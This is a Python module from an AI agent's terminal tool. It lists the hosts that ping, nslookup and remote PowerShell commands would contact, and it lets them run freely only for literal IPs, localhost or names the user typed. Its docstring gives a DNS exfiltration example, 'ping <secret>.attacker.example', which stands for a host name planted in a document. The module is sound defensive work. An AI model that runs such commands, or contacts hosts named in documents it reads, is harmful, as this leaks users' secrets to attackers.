"""
Which other computers a read-only command would contact. A lookup or ping of a name leaks that
name to DNS, so a command whose name came from a document ("ping <secret>.attacker.example")
could carry data out without anything being "changed". The terminal tool uses this to run such
commands freely only for addresses the user typed or literal IP addresses. Text analysis only.
"""

from __future__ import annotations

import ipaddress

from core.command_text import program_name

# Tools whose plain arguments are host names or addresses.
NETWORK_TOOLS = frozenset(
    {"ping", "tracert", "pathping", "nslookup", "resolve-dnsname", "test-netconnection", "tnc", "test-connection"}
)
# Parameters that send a cmdlet, or a native tool's /S, to another computer.
REMOTE_PARAMETERS = ("-computername", "-cn", "-cimsession", "-session", "-target", "-source")
REMOTE_SWITCHES = frozenset({"/s"})
MIN_PARAMETER_PREFIX = 4
LOCAL_NAMES = frozenset({"localhost"})


def network_targets(command: str) -> list[str]:
    """Every host name or address the command would contact (best effort; it errs towards
    listing more, which only means a card)."""
    targets: list[str] = []
    for statement in command.split(";"):
        words = statement.split("|")[0].split()
        if not words:
            continue
        args = words[1:]
        if program_name(words[0]) in NETWORK_TOOLS:
            targets += [arg for arg in args if not arg.startswith(("-", "/")) and not arg.isdigit()]
        targets += _remote_values(args)
    return [target.strip("'\"") for target in targets]


def is_known_target(target: str, user_text: str) -> bool:
    """A literal IP address, this PC, or a name the user typed this turn."""
    if target.lower() in LOCAL_NAMES:
        return True
    try:
        ipaddress.ip_address(target)
        return True
    except ValueError:
        return bool(target) and target.lower() in user_text.lower()


def _remote_values(args: list[str]) -> list[str]:
    """The value after -ComputerName (or a short form of it) or a native tool's /S."""
    values = []
    for index, arg in enumerate(args[:-1]):
        lowered = arg.lower()
        if lowered in REMOTE_SWITCHES or _is_remote_parameter(lowered):
            values.append(args[index + 1])
    return values


def _is_remote_parameter(lowered: str) -> bool:
    if lowered in REMOTE_PARAMETERS:
        return True
    return len(lowered) >= MIN_PARAMETER_PREFIX and any(name.startswith(lowered) for name in REMOTE_PARAMETERS)
